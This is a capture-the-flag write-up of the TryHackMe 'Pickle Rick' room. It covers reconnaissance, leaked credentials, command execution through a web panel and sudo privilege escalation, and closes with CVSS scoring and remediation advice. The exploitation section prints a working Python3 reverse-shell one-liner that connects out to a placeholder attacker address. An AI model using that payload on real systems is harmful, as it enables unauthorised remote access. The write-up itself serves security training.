# TryHackMe - Pickle Rick

**Date:** 29.05.2026  
**Author:** Sacramar_
 
**Platform:** TryHackMe  
**Room:** [Pickle Rick](https://tryhackme.com/room/picklerick)

---

## 🔍 Reconnaissance

First, I scanned the target with `nmap` to see what ports were open.
<img width="801" height="316" alt="2 pickle rick" src="https://github.com/user-attachments/assets/5c9664a7-e155-48e3-9ceb-20acd9d349bf" />

Ports 22 (SSH) and 80 (HTTP) were open. I opened the website and noticed some text that looked strange, like a burp from Rick. I decided to intercept the response with Burp Suite.
<img width="1207" height="637" alt="01 pickle rick" src="https://github.com/user-attachments/assets/5c3d3a8d-9eea-4a78-808e-43b0f5aeea9e" />



In the body of the response, I found a comment that contained a username.

<img width="1603" height="904" alt="3 pickle rick clear" src="https://github.com/user-attachments/assets/9ec0f2e4-44ac-43d1-9c84-113d9e19b291" />  

Next, I ran `gobuster` to find hidden directories and files. One of the discovered files was `robots.txt`. When I opened it, I found the password.  
  
<img width="643" height="185" alt="02 pickle rick" src="https://github.com/user-attachments/assets/125d9a6c-20db-4840-b72d-faeebcc6e95b" />



So I already had valid credentials just from the reconnaissance phase.

---


## 💥 Exploitation (RCE)

I used the found credentials to log in to the command panel at `/login.php`. The panel allowed me to run system commands directly.

<img width="1274" height="520" alt="4 pickle rick" src="https://github.com/user-attachments/assets/0f591220-685b-4623-9357-39d3993673fd" />

I first tried several simple reverse shells (like netcat, bash), but many of them were blocked or returned broken characters. After a few attempts, I settled on a Python3 reverse shell:

<img width="765" height="478" alt="5 pickle rick" src="https://github.com/user-attachments/assets/f27913b7-27ef-41c4-bfa4-17ec8c5f0ac9" />  

``bash
export RHOST="10.x.x.x"; export RPORT=9007; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'``  



Now I had a shell as www-data. I spawned a proper TTY with: python3 -c 'import pty; pty.spawn("/bin/bash")'
## ⬆️ Privilege Escalation

I checked my sudo privileges with sudo -l. To my surprise, the user www-data could run any command as any user without a password.  

<img width="731" height="471" alt="6 pickle rick" src="https://github.com/user-attachments/assets/bb0c3d32-ba55-4b66-b670-1b89322b3e06" />

<img width="571" height="491" alt="7 pickle rick" src="https://github.com/user-attachments/assets/33277a96-01dd-4ccd-85ee-503984217019" />

<img width="502" height="353" alt="8 pickle rick" src="https://github.com/user-attachments/assets/b29d919a-13e8-4099-aa6d-dc719c8602e6" />  

## 🛡️ Vulnerability Assessment (CVSS v4.0)

Here is a summary of the vulnerabilities I exploited during this test.
#	Vulnerability	CVSS v4.0 Vector	Score	Severity
1)	Sensitive Data Exposure (Credentials in HTTP comment and robots.txt)	CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P	9.3	🔴 CRITICAL  
2)  Authenticated Remote Code Execution via Command Panel	CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P	8.8	🟠 HIGH  
3)	Privilege Escalation via Sudo Misconfiguration	CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P	8.5	🟠 HIGH  

## 🔧 Remediation  

1) Remove sensitive data from public files  
2) Delete the username comment from the HTML response and remove credentials from robots.txt. All such information must be stored securely and never exposed to the web.  
3) Restrict the command panel the admin panel should not allow arbitrary system commands. Implement a whitelist of allowed commands or disable direct command execution completely.  
4) Fix sudo configuration change the sudoers file to grant only the necessary permissions for www-data. Remove ALL=(ALL) NOPASSWD: ALL and replace it with explicit allowed commands.  

## 💭 Final Thoughts

This box was fun and straightforward. The initial credential leak was easy to find, but I had to play with different reverse shells before one worked — that part taught me to always have multiple payloads ready. The privilege escalation was extremely simple, which shows how dangerous a misconfigured sudo can be.

    “Just your usual day in the life of a junior pentester.”




